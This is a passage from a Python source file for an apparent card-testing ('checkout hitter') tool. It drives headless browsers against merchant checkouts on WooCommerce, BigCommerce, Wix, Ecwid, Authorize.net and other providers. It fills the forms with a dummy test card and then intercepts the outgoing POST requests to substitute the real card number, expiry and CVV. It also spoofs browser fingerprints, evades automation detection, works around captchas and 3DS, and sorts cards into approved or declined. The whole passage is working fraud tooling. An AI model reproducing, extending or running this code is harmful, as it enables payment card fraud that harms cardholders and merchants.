        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("authorize.net" in request.url or "authorizenet" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= WOOCOMMERCE AUTOFILL =============
class WooCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#wc-stripe-card-number', '#wc-braintree-card-number', '#wc-paypal-card-number',
        'input[name="payment_method_nonce"]', '[id*="card-number"]',
        'input[autocomplete="cc-number"]', 'input[placeholder*="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#wc-stripe-card-expiry', '#wc-braintree-card-expiry',
        'input[autocomplete="cc-exp"]', 'input[placeholder*="MM / YY"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#wc-stripe-card-cvc', '#wc-braintree-card-cvv',
        'input[autocomplete="cc-csc"]', 'input[placeholder*="CVC"]',
        'input[placeholder*="CVV"]'
    ]
    NAME_SELECTORS = [
        '#billing_first_name', 'input[name="billing_first_name"]',
        'input[autocomplete="cc-name"]', 'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#billing_email', 'input[name="billing_email"]',
        'input[type="email"]', 'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        '#place_order', 'button[name="woocommerce_checkout_place_order"]',
        'button[type="submit"]', 'button:has-text("Place order")',
        'button:has-text("Pay")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST":
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= BIGCOMMERCE AUTOFILL =============
class BigCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="card_number"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiry-date', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholder_name"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '#pay-button', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("bigcommerce.com" in request.url or "bigcommerce" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= WIX AUTOFILL =============
class WixAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("wix.com" in request.url or "wix" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= ECWID AUTOFILL =============
class EcwidAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("ecwid.com" in request.url or "ecwid" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= PROVIDER MAP =============
_AUTOFILL_MAP = {
    'stripe':       StripeAutofill,
    'checkoutcom':  CheckoutComAutofill,
    'shopify':      ShopifyAutofill,
    'paypal':       PayPalAutofill,
    'braintree':    BraintreeAutofill,
    'adyen':        AdyenAutofill,
    'square':       SquareAutofill,
    'mollie':       MollieAutofill,
    'klarna':       KlarnaAutofill,
    'authorizenet': AuthorizeNetAutofill,
    'woocommerce':  WooCommerceAutofill,
    'bigcommerce':  BigCommerceAutofill,
    'wix':          WixAutofill,
    'ecwid':        EcwidAutofill,
}

# ============= CORE ASYNC HIT =============
async def _async_single_hit(checkout_url: str, card: Dict) -> Dict:
    """
    Playwright-based checkout form hitter.
    Returns dict: {success, status, message, merchant, amount, provider, receipt_url, elapsed, error}
    """
    start_time = time.time()
    result: Dict = {
        'success': False,
        'status': 'declined',
        'message': 'Unknown',
        'merchant': 'N/A',
        'amount': 'N/A',
        'provider': 'Unknown',
        'receipt_url': None,
        'elapsed': 0,
        'error': None,
    }

    try:
        async with async_playwright() as p:
            fp = FingerprintGenerator.generate()
            browser = await p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-gpu']
            )
            ctx = await browser.new_context(
                user_agent=fp['user_agent'],
                viewport=fp['viewport'],
                locale=fp['locale'],
                timezone_id=fp['timezone_id'],
                ignore_https_errors=True
            )
            page = await ctx.new_page()
            await page.add_init_script(FingerprintGenerator.get_stealth_script())

            await page.goto(checkout_url, timeout=60000, wait_until='domcontentloaded')
            await asyncio.sleep(3)

            html = await page.content()
            provider = detect_provider(checkout_url, html)
            result['provider'] = provider

            autofill_cls = _AUTOFILL_MAP.get(provider)
            if not autofill_cls:
                result['status']  = 'error'
                result['message'] = f'Unsupported provider: {provider}'
                result['error']   = result['message']
                await browser.close()
                result['elapsed'] = round(time.time() - start_time, 2)
                return result

            autofill = autofill_cls(page)
            await autofill.handle_captcha()
            await autofill.enable_card_replace(card)
            await autofill.fill_card(card)

            submitted = await autofill.submit()
            if not submitted:
                result['status']  = 'error'
                result['message'] = 'Submit button not found'
                result['error']   = result['message']
                await browser.close()
                result['elapsed'] = round(time.time() - start_time, 2)
                return result

            await asyncio.sleep(5)

            if await autofill.wait_for_3ds(10000):
                await autofill.auto_complete_3ds()
                await asyncio.sleep(5)

            await autofill.handle_captcha()

            current_url = page.url
            try:
                body_text = (await page.text_content('body') or '').lower()
            except Exception:
                body_text = ''

            result['elapsed'] = round(time.time() - start_time, 2)

            SUCCESS_KEYS = ('receipt', 'thank_you', 'thank-you', 'success', 'order_confirmation',
                            'order-confirmation', 'complete', 'confirmed', 'thankyou')
            if any(k in current_url.lower() for k in SUCCESS_KEYS):
                result['success']     = True
                result['status']      = 'approved'
                result['message']     = 'Approved'
                result['receipt_url'] = current_url
            elif 'insufficient' in body_text or 'insufficient funds' in body_text:
                result['status']  = 'insufficient_funds'
                result['message'] = 'Insufficient Funds'
            elif any(k in body_text for k in ('3d secure', 'authentication required', 'requires_action', 'verify your card')):
                result['status']  = '3ds'
                result['message'] = '3DS Authentication Required'
            elif 'declined' in body_text or 'card was declined' in body_text:
                result['status']  = 'declined'
                result['message'] = 'Card Declined'
            else:
                result['status']  = 'declined'
                result['message'] = 'Declined'

            await browser.close()

    except Exception as exc:
        result['error']   = str(exc)[:120]
        result['status']  = 'error'
        result['message'] = result['error']
        result['elapsed'] = round(time.time() - start_time, 2)

    return result


# ============= PUBLIC API =============
def dlx_hit_single(checkout_url: str, ccx: str, timeout: int = 120) -> dict:
    """
    Synchronous wrapper around the Playwright hitter.
    ccx format: "4111111111111111|12|26|123"
    Returns dict compatible with the old _h_call() format:
        {status, message, merchant, amount, time, raw, provider, receipt_url}
    status values: approved | insufficient_funds | 3ds | declined | error
    """
    parts = ccx.strip().split('|')
    if len(parts) < 4:
        return {
            'status': 'error', 'message': 'Invalid card format (need num|mm|yy|cvv)',
            'merchant': 'N/A', 'amount': 'N/A', 'time': '0s', 'raw': ''
        }

    card = {
        'card':  parts[0].strip(),
        'month': parts[1].strip().zfill(2),
        'year':  parts[2].strip().zfill(2),
        'cvv':   parts[3].strip(),
    }

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            raw_result = loop.run_until_complete(
                asyncio.wait_for(_async_single_hit(checkout_url, card), timeout=timeout)
            )
        finally:
            loop.close()
    except asyncio.TimeoutError:
        return {
            'status': 'error', 'message': f'Timeout after {timeout}s',
            'merchant': 'N/A', 'amount': 'N/A', 'time': f'{timeout}s', 'raw': ''
        }
    except Exception as e:
        return {
            'status': 'error', 'message': str(e)[:120],
            'merchant': 'N/A', 'amount': 'N/A', 'time': '0s', 'raw': ''
        }

    return {
        'status':      raw_result['status'],
        'message':     raw_result['message'],
        'merchant':    raw_result.get('merchant', 'N/A'),
        'amount':      raw_result.get('amount', 'N/A'),
        'time':        f"{raw_result.get('elapsed', 0)}s",
        'raw':         raw_result.get('message', ''),
        'provider':    raw_result.get('provider', 'Unknown'),
        'receipt_url': raw_result.get('receipt_url'),
    }
